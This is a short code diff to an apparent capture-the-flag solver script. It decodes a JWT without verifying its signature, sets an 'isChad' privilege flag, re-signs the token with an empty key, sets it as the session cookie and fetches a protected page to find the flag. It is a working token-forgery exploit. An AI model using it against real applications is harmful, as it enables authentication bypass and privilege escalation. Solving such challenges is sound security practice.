@@ -1,5 +1,5 @@
-import os
 import requests
+import os
 import re
 import jwt
 
@@ -27,10 +27,12 @@ def main():
     jwt_payload_data: dict = jwt.decode(jwt_token, options={"verify_signature": False})
 
     jwt_payload_data["isChad"] = True
-    secret_key = "idk"
+    secret_key = ""
     new_jwt = jwt.encode(jwt_payload_data, secret_key, algorithm="HS256")
+    session.cookies.set("session", new_jwt)
 
-    print(jwt_payload_data)
+    response = session.get(BASE_URL + "/chads")
+    find_flag(response.text)
 
 if __name__ == "__main__":
     main()
